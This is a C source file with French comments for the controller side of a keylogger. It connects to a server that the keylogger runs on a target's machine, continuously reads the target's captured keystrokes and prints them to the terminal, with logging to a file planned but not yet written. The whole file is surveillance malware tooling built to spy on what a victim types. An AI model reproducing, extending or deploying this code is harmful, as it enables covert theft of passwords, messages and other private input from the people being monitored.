/***********************************************************************
* FILENAME :  main.c
*
* DESCRIPTION :
*       Ce code permet de communiquer avec le keylogger en se connectant
*       au serveur demarrer par le keylogger. Il est aussi possible de
*       recuperer les touches que la cible appuie. Il est possible
*       d'afficher les touches sur le terminal mais aussi de les sauvegarder
*       dans un fichier pour logger ce que la cible a fait sur sont clavier.
*
* AUTHOR :    Yanis GENY          START DATE :    20 Jan 2024
************************************************************************/

#include <signal.h>
#include <stdlib.h>
#include <stdlib.h>
#include <time.h>

#include "libs/headers/parser.h"
#include "libs/headers/server_interact.h"

#include "libs/headers/colors.h"
#include "libs/headers/returns.h"

extern struct parser_t parser;
extern struct server_interact_t server;

void signal_stoppe_exec(int code);
void close_files_and_network(void);

int main(int argc, char **argv) {
	int func_ret;

	/*
	*  Pour utiliser ce programme il faut donner des parametres lors du
	*  lancement de l'executable. Recuperation des differents parametre
	*  et affichage du man si -h, ou manque de parametre detecte
	*/
	func_ret = search_parser(argc, argv);
	if ((parser.parser & PARSER_FLAG_HELP) == PARSER_FLAG_HELP ) {
		parser_man(func_ret);
		return func_ret;
	}

	/*
	*  Ouverture des fichiers si les flags sont active. En cas
	*  d'erreur de l'ouverture, stopper l'execution
	*/
	// A Faire

	/*
	*  Ouverture de la connection avec le serveur. Stopper l'execution
	*  en cas d'erreur
	*/
	func_ret = init_server_connection();
	if (func_ret != _SUCCESS_) {
		printf("%sConnection au serveur\n", NOK);
		// fermer les fichier ouvert
		return func_ret;
	} else {
		printf("%sConnection au serveur\n", OK);
	}

	/*
	*  Mise en place d'un gestionnaire pour ctrl+c SIGINT pour stopper la
	*  connection au serveur et fermer les fichier si ils sont ouvert
	*  pour quitter le programme sans 
	*/
	signal(SIGINT, &signal_stoppe_exec);

	/*
	*  Boucle d'execution pour recuperer les touches du keylogger et
	*  enregistrer dans le fichier si le flag est actif, et afficher
	*  sur le terminal si le flag est active.
	*/
	while(1) {
		func_ret = read_keys();
		if(func_ret != _SUCCESS_) {
			printf("%s***ERROR when reading char from server\nClosing execution%s\n", RED, DEFAULT_COLOR);
			close_files_and_network();
			return func_ret;
		}
		
		if ((parser.parser & PARSER_FLAG_VERBOSE) == PARSER_FLAG_VERBOSE) {
			// affichage des touches sur le terminal
			// pour le moment avec printf mais evolution possible
			// si changement de methode de transfert des touches
			printf("%s", server.buffer);
			fflush(stdout);
		}
	}

	return _SUCCESS_;
}

void signal_stoppe_exec(int code) {
	printf("\n%sSignal d'arret intercepter%s: erret du prcessucce\n", RED, DEFAULT_COLOR);

	close_files_and_network();

	// stopper l'execution
	exit(_SUCCESS_);
}

void close_files_and_network(void) {
	// fermer les fichier ouvert
	// A faire lorsque la gestion des fichier sera fait

	// fermer le connection au server
	if (server.sockfd > 0) {
		if (close_server_connection() == _SUCCESS_)
			printf("%sdeconnection au serveur\n", OK);
		else
			printf("%sdeconnection au serveur\n", NOK);
	}
}